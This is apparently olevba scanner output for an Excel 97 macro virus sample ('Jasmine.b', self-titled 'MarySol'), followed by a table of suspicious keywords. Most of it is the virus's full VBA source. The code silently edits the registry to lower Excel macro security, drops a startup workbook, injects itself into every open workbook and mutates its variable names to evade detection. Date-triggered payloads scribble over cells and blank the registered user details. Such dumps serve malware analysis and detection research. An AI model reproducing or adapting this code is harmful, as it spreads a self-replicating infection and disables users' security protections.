olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Jasmine.b-e9e3b54c17c26eb79f92604c282147501c5714c9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Jasmine.b-e9e3b54c17c26eb79f92604c282147501c5714c9 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List1.cls 
in file: Virus.MSExcel.Jasmine.b-e9e3b54c17c26eb79f92604c282147501c5714c9 - OLE stream: '_VBA_PROJECT_CUR/VBA/List1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Excel97.
'Copyright (c) 1999, cry0tek

Private Sub Workbook_Deactivate()
'XL
On Error Resume Next
Dim tw As Object
RegKey = "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
Set aw = ActiveWorkbook.VBProject.VBComponents.Item("ThisWorkBook").CodeModule
Set tw = ThisWorkbook.VBProject.VBComponents.Item("ThisWorkBook").CodeModule
RegFile = "c:\remove.reg"
If UCase(Dir(Application.StartupPath + "\Book1.")) <> "BOOK1" Then
 Open RegFile For Output As 1
 Print #1, "REGEDIT4"
 If Left(Application.Version, 1) = 9 Then
  Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
  Print #1, """Level""=dword:00000001"
 Else
  Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
  Print #1, "[HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User\Settings\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
  Print #1, "[HKEY_USERS\.Default\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
  Print #1, """Options6""=dword:00000000"
 End If
 Close 1
 Shell "regedit /s " & RegFile, vbHide
 Kill RegFile
 Call Encode(tw)
 Workbooks.Add.SaveAs Excel.Application.StartupPath & "\BOOK1.", FileFormat:=xlNormal, AddToMru:=False
 Workbooks("Book1.").Close savechanges:=True
End If
For i = 1 To Workbooks.Count
 Set WBook = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule
 If WBook.Lines(5, 1) <> "'XL" Then
  WBook.InsertLines 1, tw.Lines _
   (1, tw.CountOfLines)
 End If
Next
If Minute(Now) = Second(Now) Then
 Select Case Day(Now)
  Case 5 And Int((5 * Rnd) + 1) = 1
   Application.StatusBar = "Excel97.MarySol v1.0"
  Case 10 And Int((5 * Rnd) + 1) = 1
   With Assistant.NewBalloon
    .Heading = "Excel97.MarySol v1.0"
    .Text = "So many questions, but the answers are so few..." & vbCr & vbCr
    .Animation = 22
    .Show
   End With
  Case 15 And Int((5 * Rnd) + 1) = 1
   For ii = 1 To 600 Step Int((Rnd * 2) + 1)
    lct = Chr(65 + Int(Rnd * 26))
    jj = lct & (Int(Rnd * 20) + 1)
    Range(jj).Select
    ActiveCell.FormulaR1C1 = "Excel97.MarySol"
    Range(jj).Select
    With Selection.Font
     .Name = "Arial"
     .Size = 10
    End With
    Range(jj).Select
    With Selection.Interior
     .ColorIndex = Int((Rnd * 56) + 1)
     .Pattern = xlSolid
    End With
    Columns(lct & ":" _
      & lct).EntireColumn.AutoFit
    Selection.Font.ColorIndex = Int((Rnd * 56) + 1)
   Next
  Case 20 And Int((5 * Rnd) + 1) = 1
   System.PrivateProfileString("", RegKey, "DefName") = ""
   System.PrivateProfileString("", RegKey, "DefCompany") = ""
 End Select
End If
End Sub
Private Sub Encode(Loc As Object)
Dim varray(1 To 13) As String
Dim var1 As Long: Dim var2 As Long: Dim var3 As Long: Dim var4 As Long
 Randomize
 varray(1) = "aw": varray(2) = "tw": varray(3) = "RegFile": varray(4) = "var1": varray(5) = "var2": varray(6) = "var3"
 varray(7) = "var4": varray(8) = "WBook": varray(9) = "Encode": varray(10) = "lct": varray(11) = "jj": varray(12) = "ii": varray(13) = "RegKey"
 For i = 1 To 13
  For j = 1 To Int((10 * Rnd) + 1)
   PolyVal = PolyVal + Chr(65 + Int(Rnd * 26)) & Chr(122 - Int(Rnd * 26)) & Chr(48 + Int(Rnd * 10))
  Next
  With Loc
   var1 = 1: var2 = 1: var3 = .CountOfLines: var4 = Len(.Lines(.CountOfLines, 1))
   Do While .Find(varray(i), var1, var2, var3, var4, True)
    strVal = .Lines(var1, 1)
    strVal = Left(strVal, var2 - 1) & PolyVal & Mid(strVal, var4)
    .ReplaceLine var1, strVal
    var1 = var3 + 1: var2 = 1
    var3 = .CountOfLines: var4 = Len(.Lines(.CountOfLines, 1))
   Loop
  End With
  PolyVal = ""
 Next
End Sub


-------------------------------------------------------------------------------
VBA MACRO List2.cls 
in file: Virus.MSExcel.Jasmine.b-e9e3b54c17c26eb79f92604c282147501c5714c9 - OLE stream: '_VBA_PROJECT_CUR/VBA/List2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO List3.cls 
in file: Virus.MSExcel.Jasmine.b-e9e3b54c17c26eb79f92604c282147501c5714c9 - OLE stream: '_VBA_PROJECT_CUR/VBA/List3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |remove.reg          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

